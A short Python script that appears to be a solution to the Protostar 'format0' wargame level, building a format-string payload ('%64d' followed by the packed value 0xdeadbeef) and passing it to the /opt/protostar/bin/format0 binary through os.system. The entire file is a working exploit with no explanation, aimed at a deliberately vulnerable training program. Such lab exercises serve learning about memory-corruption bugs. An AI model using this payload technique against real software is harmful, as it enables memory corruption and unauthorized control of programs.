
import os
import struct
sploit="%64d" + struct.pack("I", 0xdeadbeef)
os.system("/opt/protostar/bin/format0 %s" % sploit)
